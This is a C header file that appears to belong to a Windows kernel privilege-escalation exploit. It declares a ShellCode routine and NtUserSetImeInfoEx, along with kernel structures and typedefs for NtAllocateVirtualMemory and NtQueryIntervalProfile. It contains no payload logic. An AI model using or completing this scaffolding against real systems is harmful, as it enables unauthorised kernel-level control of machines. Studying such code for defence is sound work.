#pragma once
#include<Windows.h>

void ShellCode();
void NtUserSetImeInfoEx();

#define IM_UI_CLASS_SIZE        16
#define IM_FILE_SIZE            80
#define IM_DESC_SIZE            50
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef struct {
	DWORD       dwPrivateDataSize;
	DWORD       fdwProperty;
	DWORD       fdwConversionCaps;
	DWORD       fdwSentenceCaps;
	DWORD       fdwUICaps;
	DWORD       fdwSCSCaps;
	DWORD       fdwSelectCaps;
} tagIMEINFO;

typedef struct _GDICELL {
	LPVOID pKernelAddress;
	USHORT wProcessId;
	USHORT wCount;
	USHORT wUpper;
	USHORT wType;
	LPVOID pUserAddress;
} GDICELL, * PGDICELL;

typedef struct {
	HKL         hkl;
	tagIMEINFO  ImeInfo;
	WCHAR       wszUIClass[IM_UI_CLASS_SIZE];
	DWORD       fdwInitConvMode;
	BOOL        fInitOpen;
	BOOL        fLoadFlag;
	DWORD       dwProdVersion;
	DWORD       dwImeWinVersion;
	WCHAR       wszImeDescription[IM_DESC_SIZE];
	WCHAR       wszImeFile[IM_FILE_SIZE];
	CHAR        fSysWow64Only : 1;
	BYTE        fCUASLayer : 1;
} tagIMEINFOEX;

typedef NTSTATUS
(WINAPI* My_NtAllocateVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PULONG RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect
	);

typedef struct _THRDESKHEAD {
	HANDLE  h;
	DWORD   cLockObj;
	PVOID   pti;
	PVOID   rpdesk;
	PBYTE   pSelf;
} THRDESKHEAD, * PTHRDESKHEAD;

typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(
	IN ULONG ProfileSource,
	OUT PULONG Interval
	);